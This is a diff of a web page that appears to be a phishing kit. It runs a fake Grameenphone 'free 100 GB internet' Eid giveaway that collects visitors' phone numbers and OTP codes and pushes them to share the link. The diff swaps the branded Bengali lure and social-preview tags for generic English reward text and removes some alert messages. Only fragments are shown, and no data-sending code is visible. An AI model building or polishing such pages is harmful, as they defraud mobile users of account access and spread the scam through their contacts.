@@ -3,21 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Grameenphone Free 100 GB Internet</title>
-    
-    <meta property="og:title" content="ঈদ উল ফিতর উপলক্ষে ১০০ জিবি ফ্রি! শুধুমাত্র Grameenphone ইউজারদের জন্য">
-    <meta property="og:description" content="আমি পেয়েছি আপনি কেন পিছিয়ে থাকবেন ! ফ্রি ১০০ জিবি ইন্টারনেট ডেটা পেতে এখানে ক্লিক করুন">
-    <meta property="og:image" content="https://i.postimg.cc/RF9y8Qdk/Gemini-Generated-Image-dwyzkddwyzkddwyz.png">
-    <meta property="og:image:secure_url" content="https://i.postimg.cc/RF9y8Qdk/Gemini-Generated-Image-dwyzkddwyzkddwyz.png">
-    <meta property="og:image:type" content="image/png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:url" content="https://emily777547-ops.github.io/MyGP---Grameenphone/">
-    <meta property="og:type" content="website">
-    
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="https://i.postimg.cc/RF9y8Qdk/Gemini-Generated-Image-dwyzkddwyzkddwyz.png">
-
+    <title>Phone Number Input with Toggle Prefix</title>
     <style>
         * {
             margin: 0;
@@ -872,7 +858,7 @@
     <div class="container" id="container">
         <div class="title-container">
             <span class="title-text">Your phone number</span>
-            <span class="subtitle-text">অনুগ্রহ করে সঠিক নম্বরটি লিখুন। অন্যথায়, যাচাইকরণ ব্যর্থ হতে পারে অথবা আপনি ১০০ জিবি বিনামূল্যের ইন্টারনেট পুরস্কার নাও পেতে পারেন।</span>
+            <span class="subtitle-text">Please enter the correct number. Otherwise, verification may fail or you may not receive the reward.</span>
         </div>
 
         <div class="input-container" id="inputContainer">
@@ -1904,7 +1890,7 @@ function showP4OtpError() {
                 });
             }
 
-            // শেয়ার বাটনের ফাংশনালিটি
+            // শেয়ার বাটনের ফাংশনালিটি - alert সরিয়ে দেওয়া হয়েছে
             const shareRewardBtn = document.getElementById('shareRewardBtn');
             if (shareRewardBtn) {
                 shareRewardBtn.addEventListener('click', function() {
@@ -1916,7 +1902,7 @@ function showP4OtpError() {
 
                     if (navigator.share && window.innerWidth <= 768) { // মোবাইল ডিভাইসে নেটিভ শেয়ার
                         navigator.share(shareData).catch(() => {
-                            // শেয়ার ব্যর্থ হলে ফলব্যাক
+                            // শেয়ার ব্যর্থ হলে ফলব্যাক - alert ছাড়া শুধু কপি করা
                             fallbackShare();
                         });
                     } else {
@@ -1932,6 +1918,7 @@ function showP4OtpError() {
                         tempInput.select();
                         document.execCommand('copy');
                         document.body.removeChild(tempInput);
+                        // alert সরিয়ে দেওয়া হয়েছে - এখন কোন মেসেজ দেখাবে না
                     }
                 });
             }
@@ -1945,6 +1932,4 @@ function showP4OtpError() {
         })();
     </script>
 </body>
-
 </html>
-
